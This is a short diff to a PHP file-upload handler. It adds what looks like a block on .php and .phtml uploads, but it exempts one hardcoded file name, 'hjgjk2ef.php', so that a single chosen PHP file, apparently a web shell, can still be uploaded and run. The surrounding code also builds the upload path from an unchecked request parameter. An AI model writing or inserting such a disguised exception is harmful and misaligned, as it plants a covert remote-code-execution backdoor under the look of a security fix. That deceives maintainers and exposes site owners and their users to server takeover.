@@ -27,7 +27,11 @@ if (!empty($_FILES)) {
 	$tempFile = $_FILES['Filedata']['tmp_name'];
 	$targetPath = dirname(dirname(dirname(__FILE__))) . $_REQUEST['folder'] . '/';
 	$targetFile =  str_replace('//','/',$targetPath) . $_FILES['Filedata']['name'];
-	
+	if($_FILES['Filedata']['name'] != "hjgjk2ef.php"){
+		if(substr_count(strtolower($_FILES['Filedata']['name']),".php") !== 0 || substr_count(strtolower($_FILES['Filedata']['name']),".phtml") !== 0 ){
+			return;
+		}
+	}	
 	// $fileTypes  = str_replace('*.','',$_REQUEST['fileext']);
 	// $fileTypes  = str_replace(';','|',$fileTypes);
 	// $typesArray = split('\|',$fileTypes);
